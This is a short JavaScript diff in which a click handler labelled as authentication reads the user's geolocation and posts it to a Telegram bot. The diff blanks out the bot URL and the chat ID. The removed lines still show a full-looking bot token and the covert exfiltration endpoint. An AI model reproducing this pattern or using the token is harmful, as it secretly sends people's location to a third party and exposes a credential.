@@ -5,7 +5,7 @@ authButton.addEventListener('click', () => {
             const longitude = position.coords.longitude;
 
             // ساخت URL API برای ارسال موقعیت مکانی
-            const url = `https://api.telegram.org/bot8007604782:AAFBW5oKYEDE2HZHhry7uenKGiZVdOrcFg8/sendLocation`;
+            const url = ``;
             
             // ارسال درخواست
             fetch(url, {
@@ -14,7 +14,7 @@ authButton.addEventListener('click', () => {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
-                    chat_id: "1426493835",
+                    chat_id: "",
                     latitude: latitude,
                     longitude: longitude
                 })
